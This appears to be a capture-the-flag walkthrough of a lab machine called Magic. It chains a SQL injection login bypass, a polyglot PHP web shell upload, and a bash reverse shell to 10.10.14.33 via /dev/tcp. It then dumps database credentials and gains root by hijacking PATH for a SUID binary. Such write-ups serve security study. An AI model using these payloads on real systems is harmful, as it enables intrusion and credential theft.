
## Intro

**Tags:** #linux #OSCPpath #WebApp #SQL-injection #FileUpload #DB #unknown-binary #PathHijack #medium

---
# Reconnaissance

## Port Scanning

A full TCP port scan reveals two open services: SSH on port 22 and HTTP on port 80.

```bash
nmap -p- --open -n -Pn -sS -vvv --min-rate 5000 10.10.10.185 -oG allPorts
```

```shell
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Service Version Detection

A targeted version scan identifies Ubuntu Linux with Apache 2.4.29 and OpenSSH 7.6p1.
```bash
nmap -sCV -p22,80 10.10.10.185 -oN targeted
```

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## WebApp

![](MediaFiles/Pasted%20image%2020261002225226.png)

### Directories

Directory brute-forcing reveals a login portal and an upload page.
```bash
feroxbuster -u http://10.10.10.185/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -e .php
```

```shell
200      GET        http://10.10.10.185/login.php
200      GET        http://10.10.10.185/index.php
301      GET        http://10.10.10.185/images
301      GET        http://10.10.10.185/assets
```

### Login Page Discovery

Browsing to the web server reveals a Magic Portfolio site with a login link. The `login.php` page is the primary attack surface.

---

# Foothold

## SQL Injection 

### Authentication Bypass

The login page is vulnerable to classic SQL injection. A boolean-based payload in `username` field bypasses authentication.
```bash
' OR 1=1-- -
```
After successful injection, the application redirects to `upload.php`, revealing an `image upload` feature .

## Polyglot Image Upload to RCE

The upload form validates file content by checking image magic bytes. A polyglot file with valid JPEG magic bytes followed by PHP code bypasses the filter. The `.php.jpg` double extension exploits Apache's extension handling .

### Creating the Polyglot Payload
```bash
printf '\xFF\xD8\xFF\xE0<?php system($_REQUEST["cmd"]); ?>' > shell.php.jpg
```

### Locating the Upload Directory

Enumerate the upload path to confirm where files are stored.
```bash
feroxbuster -u http://10.10.10.185/ -d 2
```

```shell
301      GET        http://10.10.10.185/images/uploads
```

### Triggering Command Execution

Access the uploaded polyglot to execute commands as `www-data`.
```bash
curl 'http://10.10.10.185/images/uploads/shell.php.jpg?cmd=whoami'
```

```shell
www-data
```

## Shell as www-data

Send a reverse shell payload through the `cmd` parameter.

```bash
# Start listener
nc -lvnp 4444

# Trigger reverse shell
curl 'http://10.10.10.185/images/uploads/shell.php.jpg?cmd=bash -c "bash -i >& /dev/tcp/10.10.14.33/4444 0>&1"'
```
got shell back
```shell
connect to [10.10.14.33] from (UNKNOWN) [10.10.10.185] 54321
www-data@ubuntu:/var/www/Magic/images/uploads$
```
stabilize shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## Filesystem enumeration

Enumerate the web application directory for configuration files containing credentials.
```bash
cat /var/www/Magic/db.php5
```

```php
private static $dbName = 'Magic' ;
private static $dbHost = 'localhost' ;
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
```
#### creds obtained

The credentials `theseus:iamkingtheseus` are exposed in plaintext .

## Lateral Movement to theseus attempt failed

Direct SSH with the database password fails.
```bash
ssh theseus@10.10.10.185
# Permission denied
```

## Dumping the Database

The `mysqldump` utility is available on the system. Dump the `Magic` database to find additional credentials.
```bash
mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
```

```shell
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
```
#### creds obtained
A new password for `theseus` is recovered: `Th3s3usW4sK1ng` .

### Switching User

```bash
su theseus
# Password: Th3s3usW4sK1ng
```

## Shell as theseus
```shell
theseus@ubuntu:/var/www/Magic$ id
uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
```
grabbed user flag

---
# Privilege Escalation

## SUID Binary Enumeration

Search for SUID binaries on the system.
```bash
find / -perm -4000 -type f 2>/dev/null
```

### Unknown binary
```shell
/bin/sysinfo
```
The `/bin/sysinfo` binary stands out as non-standard .

## Analyzing sysinfo

Run `strings` on the binary to understand its behavior.
```bash
strings /bin/sysinfo
```

```shell
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
...
```
### Path hijacking possible
The binary calls `lshw`, `fdisk`, and other utilities **without specifying full paths**, making it vulnerable to PATH hijacking .

## Exploiting PATH Hijack

### Creating Malicious fdisk

Create a malicious `fdisk` executable in `/tmp` that spawns a root shell.
```bash
cat > /tmp/fdisk << 'EOF'
#!/bin/bash
/bin/bash
EOF

chmod +x /tmp/fdisk
```

### Prepend /tmp to PATH and Execute sysinfo
```bash
export PATH=/tmp:$PATH
/bin/sysinfo
```

## Shell as root
```shell
root@ubuntu:/home/theseus# id
uid=0(root) gid=0(root) groups=0(root)
```
The SUID binary executes the malicious `fdisk` from `/tmp` instead of the legitimate binary .

---
